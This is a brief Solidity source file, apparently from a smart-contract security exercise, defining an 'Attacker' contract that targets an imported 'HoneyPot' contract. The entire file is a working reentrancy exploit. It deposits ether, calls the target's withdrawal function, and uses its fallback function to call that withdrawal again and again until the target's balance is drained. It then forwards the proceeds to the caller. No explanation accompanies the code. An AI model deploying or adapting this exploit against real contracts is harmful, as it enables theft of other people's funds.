pragma solidity 0.4.13;

import "./HoneyPot.sol";

contract Attacker {
    function attack(address honeyPot) payable {
        uint before = this.balance;
        HoneyPot(honeyPot).put.value(msg.value)();
        HoneyPot(honeyPot).get();
        require(this.balance > before);
        msg.sender.transfer(this.balance);
    }

    function() payable {
        assembly {
            // The cheapest logging I could think of.
            log0(0, 0)
        }
        if (msg.sender.balance >= msg.value && msg.gas >= 20000) {
            HoneyPot(msg.sender).get();
        }
    }
}